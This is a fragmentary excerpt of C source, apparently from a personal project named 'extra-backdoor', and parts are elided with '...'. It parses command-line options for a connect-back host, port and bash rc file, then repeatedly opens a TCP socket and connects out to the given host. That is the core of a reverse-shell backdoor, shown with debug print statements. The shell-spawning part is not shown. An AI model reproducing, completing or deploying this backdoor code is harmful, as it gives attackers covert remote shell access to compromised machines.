...
extern char *optarg;
char *rcfile = "/home/anass/myprojects/extra-backdoor/shell/bashsrc";
...
while ((opt = getopt(argc, argv, "t:s:p:r:")) != -1) {
        printf("the while option called \n");
		switch (opt) {
		case 't':
			connect_back_host = strdup(optarg);
			printf("connect_back_host %s",connect_back_host);
			break;
		case 'p':
			connect_back_port = atoi(optarg);
			printf("connect_back_port %d",connect_back_port);
			if (!connect_back_port) {
                printf("no connect back host \n");
		goto out;
			}
			break;
		case 's':
	...
	do {
        printf("the do while get called \n");
		if (delay > 0)
			sleep(delay);

		client = socket(PF_INET, SOCK_STREAM, 0);
		printf("this is socket %d",client);
		if (client < 0)
			continue;
		...
		ret = connect(client, (struct sockaddr *)&client_addr,
			      sizeof(client_addr));
         printf("the connection status %d",ret);
		if (ret < 0) {
			close(client);
			continue;
		}
